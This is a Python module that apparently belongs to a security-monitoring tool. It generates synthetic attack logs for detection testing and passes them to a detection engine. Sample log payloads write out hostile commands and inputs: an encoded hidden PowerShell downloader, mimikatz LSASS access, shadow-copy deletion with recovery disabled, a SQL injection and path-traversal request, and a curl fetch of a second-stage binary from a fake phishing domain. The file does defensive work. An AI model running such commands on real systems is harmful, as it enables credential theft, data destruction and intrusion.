import random
from datetime import datetime, timedelta
from app.models.models import SecurityLog, SimulationHistory
from app.detection_engine.engine import DetectionEngine

class SimulationService:
    """
    Generates controlled, realistic synthetic security log entries
    for each of the 8 detection scenarios, feeds them into the detection engine,
    and records simulation history.
    """

    @classmethod
    def simulate_attack(cls, db_session, attack_type):
        attack_map = {
            "brute_force": cls._generate_brute_force_logs,
            "port_scan": cls._generate_port_scan_logs,
            "suspicious_login": cls._generate_suspicious_login_logs,
            "malware": cls._generate_malware_logs,
            "data_exfiltration": cls._generate_data_exfiltration_logs,
            "unauthorized_access": cls._generate_unauthorized_access_logs,
            "ddos": cls._generate_ddos_logs,
            "phishing": cls._generate_phishing_logs,
        }

        generator = attack_map.get(attack_type.lower())
        if not generator:
            raise ValueError(f"Unknown attack simulation type: {attack_type}")

        # 1. Generate realistic synthetic security logs
        logs = generator()

        # 2. Save logs to database
        created_log_models = []
        for log_data in logs:
            log_model = SecurityLog(**log_data)
            db_session.add(log_model)
            created_log_models.append(log_model)
        
        db_session.flush()

        # 3. Run Detection Engine on the generated logs
        engine_result = DetectionEngine.process_logs(db_session, created_log_models)

        # 4. Record simulation history
        sim_name = attack_type.replace("_", " ").title() + " Simulation"
        history = SimulationHistory(
            simulation_name=sim_name,
            attack_type=attack_type,
            logs_generated=len(created_log_models),
            alerts_generated=engine_result["alerts_created"],
            incidents_created=engine_result["incidents_created"],
            status="Completed",
            timestamp=datetime.utcnow()
        )
        db_session.add(history)
        db_session.commit()

        return {
            "simulation": sim_name,
            "attack_type": attack_type,
            "logs_generated": len(created_log_models),
            "alerts_created": engine_result["alerts_created"],
            "incidents_created": engine_result["incidents_created"],
            "alerts": engine_result["alerts"],
            "incidents": engine_result["incidents"]
        }

    @staticmethod
    def _generate_brute_force_logs():
        logs = []
        attacker_ip = f"198.51.100.{random.randint(10, 80)}"
        target_server = "10.0.4.15"
        now = datetime.utcnow()
        target_user = "admin_svc"

        # 7 failed logins spaced 15 seconds apart within 2 minutes
        for i in range(7):
            t = now - timedelta(seconds=(7 - i) * 18)
            logs.append({
                "timestamp": t,
                "source_ip": attacker_ip,
                "destination_ip": target_server,
                "username": target_user,
                "event_type": "Authentication",
                "action": "LOGIN_FAILED",
                "protocol": "SSH",
                "status": "FAILED",
                "description": f"Failed password authentication attempt for user '{target_user}' from {attacker_ip} port {random.randint(40000, 60000)}",
                "hostname": "auth-gateway-prod",
                "port": 22,
                "bytes_sent": 128,
                "bytes_received": 256,
                "raw_payload": "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.4 AuthFail"
            })
        return logs

    @staticmethod
    def _generate_port_scan_logs():
        logs = []
        attacker_ip = f"203.0.113.{random.randint(20, 95)}"
        target_server = "192.168.10.50"
        now = datetime.utcnow()
        scan_ports = [21, 22, 23, 25, 80, 110, 135, 139, 443, 445, 1433, 3306, 3389, 8080]

        for i, port in enumerate(scan_ports):
            t = now - timedelta(seconds=(len(scan_ports) - i) * 5)
            logs.append({
                "timestamp": t,
                "source_ip": attacker_ip,
                "destination_ip": target_server,
                "username": "anonymous",
                "event_type": "Network",
                "action": "PORT_SWEEP_SYN",
                "protocol": "TCP",
                "status": "BLOCKED",
                "description": f"Inbound TCP SYN packet intercepted on port {port} without completed handshake",
                "hostname": "perimeter-firewall-01",
                "port": port,
                "bytes_sent": 64,
                "bytes_received": 0,
                "raw_payload": f"FLAGS=SYN TTL=64 WINDOW=1024 TARGET_PORT={port}"
            })
        return logs

    @staticmethod
    def _generate_suspicious_login_logs():
        logs = []
        attacker_ip = f"185.220.101.{random.randint(15, 75)}"
        target_server = "10.0.1.20"
        user = "executive_cfo"
        now = datetime.utcnow()

        # 3 failed logins followed immediately by a SUCCESS
        for i in range(3):
            t = now - timedelta(seconds=(4 - i) * 30)
            logs.append({
                "timestamp": t,
                "source_ip": attacker_ip,
                "destination_ip": target_server,
                "username": user,
                "event_type": "Authentication",
                "action": "LOGIN_FAILED",
                "protocol": "HTTPS",
                "status": "FAILED",
                "description": f"Failed Web SSO authentication for account '{user}' - invalid credentials supplied.",
                "hostname": "identity-sso-server",
                "port": 443,
                "bytes_sent": 340,
                "bytes_received": 512,
                "raw_payload": f"POST /api/v1/auth/login username={user} error=INVALID_CREDENTIALS"
            })

        # Successful login
        logs.append({
            "timestamp": now - timedelta(seconds=10),
            "source_ip": attacker_ip,
            "destination_ip": target_server,
            "username": user,
            "event_type": "Authentication",
            "action": "LOGIN_SUCCESS",
            "protocol": "HTTPS",
            "status": "SUCCESS",
            "description": f"Successful Web SSO authentication for account '{user}' from an unverified geographic IP ({attacker_ip}).",
            "hostname": "identity-sso-server",
            "port": 443,
            "bytes_sent": 1024,
            "bytes_received": 2048,
            "raw_payload": f"POST /api/v1/auth/login username={user} session_token_issued"
        })
        return logs

    @staticmethod
    def _generate_malware_logs():
        logs = []
        host_ip = f"10.0.2.{random.randint(10, 200)}"
        dest_c2_ip = "91.240.118.88"
        now = datetime.utcnow()

        logs.append({
            "timestamp": now - timedelta(seconds=35),
            "source_ip": host_ip,
            "destination_ip": dest_c2_ip,
            "username": f"dev_user_{random.randint(1, 99)}",
            "event_type": "Endpoint",
            "action": "PROCESS_EXECUTION",
            "protocol": "HOST_OS",
            "status": "ALERT",
            "description": "Suspicious PowerShell command launched: powershell -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQA...",
            "hostname": f"workstation-dev-{random.randint(10, 99)}",
            "port": 0,
            "bytes_sent": 0,
            "bytes_received": 0,
            "raw_payload": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -NonI -W Hidden -enc <encoded-downloader>"
        })

        logs.append({
            "timestamp": now - timedelta(seconds=20),
            "source_ip": host_ip,
            "destination_ip": dest_c2_ip,
            "username": "SYSTEM",
            "event_type": "Endpoint",
            "action": "MALWARE_DETECTED",
            "protocol": "HOST_OS",
            "status": "ALERT",
            "description": f"Critical malware detection: mimikatz.exe credential dumper injected on {host_ip}.",
            "hostname": f"workstation-dev-{random.randint(10, 99)}",
            "port": 0,
            "bytes_sent": 0,
            "bytes_received": 0,
            "raw_payload": "Process: C:\\Users\\Temp\\mimikatz.exe -> LSASS access mask 0x1410"
        })

        logs.append({
            "timestamp": now - timedelta(seconds=5),
            "source_ip": host_ip,
            "destination_ip": dest_c2_ip,
            "username": "SYSTEM",
            "event_type": "Endpoint",
            "action": "RANSOMWARE_INDICATOR",
            "protocol": "HOST_OS",
            "status": "ALERT",
            "description": "Ransomware defense alert: vssadmin delete shadows /all /quiet command executed to delete restore points.",
            "hostname": f"workstation-dev-{random.randint(10, 99)}",
            "port": 0,
            "bytes_sent": 0,
            "bytes_received": 0,
            "raw_payload": "vssadmin delete shadows /all /quiet & bcdedit /set {default} recoveryenabled No"
        })
        return logs

    @staticmethod
    def _generate_data_exfiltration_logs():
        logs = []
        internal_db = f"10.0.5.{random.randint(10, 200)}"
        external_dest = f"142.250.190.{random.randint(10, 99)}"
        now = datetime.utcnow()

        # Large outbound transfer: 3 chunks of 8MB each = 24MB (> 15MB threshold)
        for i in range(3):
            t = now - timedelta(seconds=(3 - i) * 20)
            logs.append({
                "timestamp": t,
                "source_ip": internal_db,
                "destination_ip": external_dest,
                "username": "db_backup_service",
                "event_type": "Network",
                "action": "DATA_TRANSFER_OUTBOUND",
                "protocol": "HTTPS",
                "status": "ALLOWED",
                "description": f"Unusual high-volume encrypted payload stream transferred to unclassified external IP {external_dest}.",
                "hostname": "db-production-vault",
                "port": 443,
                "bytes_sent": 8 * 1024 * 1024 + random.randint(1000, 50000),
                "bytes_received": 1024,
                "raw_payload": f"TLS1.3 Encrypted Handshake Flow ID #{random.randint(10000, 99999)} - Destination Cloud Bucket Storage"
            })
        return logs

    @staticmethod
    def _generate_unauthorized_access_logs():
        logs = []
        attacker_ip = f"172.16.88.{random.randint(10, 99)}"
        target_web = "10.0.3.50"
        now = datetime.utcnow()

        paths = [
            "/admin/secrets/master_key.json",
            "/api/v1/users?id=1' UNION SELECT username,password_hash FROM users--",
            "/../../../../etc/passwd",
            "/system/conf/credentials.xml",
            "/admin/database/backup.sql"
        ]

        for i, path in enumerate(paths):
            t = now - timedelta(seconds=(len(paths) - i) * 12)
            logs.append({
                "timestamp": t,
                "source_ip": attacker_ip,
                "destination_ip": target_web,
                "username": "guest",
                "event_type": "Application",
                "action": "ACCESS_VIOLATION",
                "protocol": "HTTP",
                "status": "FORBIDDEN",
                "description": f"Access control rejection: 403 Forbidden when requesting restricted endpoint '{path}'",
                "hostname": "web-cluster-api-01",
                "port": 80,
                "bytes_sent": 450,
                "bytes_received": 220,
                "raw_payload": f"GET {path} HTTP/1.1 User-Agent: sqlmap/1.7.2#dev"
            })
        return logs

    @staticmethod
    def _generate_ddos_logs():
        logs = []
        botnet_ip = f"194.26.29.{random.randint(10, 80)}"
        target_web = "10.0.3.80"
        now = datetime.utcnow()

        # 20 rapid bursts within 40 seconds
        for i in range(20):
            t = now - timedelta(seconds=int((20 - i) * 1.8))
            logs.append({
                "timestamp": t,
                "source_ip": botnet_ip,
                "destination_ip": target_web,
                "username": "anonymous",
                "event_type": "Network",
                "action": "HTTP_FLOOD_REQUEST",
                "protocol": "TCP",
                "status": "ALERT",
                "description": f"Rapid volumetric HTTP request flood targeting /api/v1/catalog search endpoint from {botnet_ip}.",
                "hostname": "edge-balancer-nginx",
                "port": 80,
                "bytes_sent": 512,
                "bytes_received": 256,
                "raw_payload": "GET /api/v1/catalog?q=stress_test HTTP/1.1 FloodRate=HIGH"
            })
        return logs

    @staticmethod
    def _generate_phishing_logs():
        logs = []
        internal_client = f"10.0.8.{random.randint(10, 200)}"
        phishing_c2 = "192.0.2.177"
        now = datetime.utcnow()

        logs.append({
            "timestamp": now - timedelta(seconds=40),
            "source_ip": internal_client,
            "destination_ip": phishing_c2,
            "username": "hr_manager",
            "event_type": "Application",
            "action": "MALICIOUS_LINK_CLICKED",
            "protocol": "HTTPS",
            "status": "ALERT",
            "description": f"User on {internal_client} clicked embedded link navigating to known deceptive domain 'https://login-verify-corp.xyz/update-payroll'.",
            "hostname": "corp-laptop-hr01",
            "port": 443,
            "bytes_sent": 850,
            "bytes_received": 1400,
            "raw_payload": "GET /update-payroll HTTP/2 Host: login-verify-corp.xyz Referer: Outlook Web App"
        })

        logs.append({
            "timestamp": now - timedelta(seconds=20),
            "source_ip": internal_client,
            "destination_ip": phishing_c2,
            "username": "hr_manager",
            "event_type": "Endpoint",
            "action": "SUSPICIOUS_ATTACHMENT_EXEC",
            "protocol": "HOST_OS",
            "status": "ALERT",
            "description": "Execution of suspicious macro-enabled file: invoice_overdue_88291.xlsm spawned cmd.exe subprocess.",
            "hostname": "corp-laptop-hr01",
            "port": 0,
            "bytes_sent": 0,
            "bytes_received": 0,
            "raw_payload": "EXCEL.EXE -> SPAWNED: cmd.exe /c curl -s https://login-verify-corp.xyz/stage2.bin"
        })
        return logs
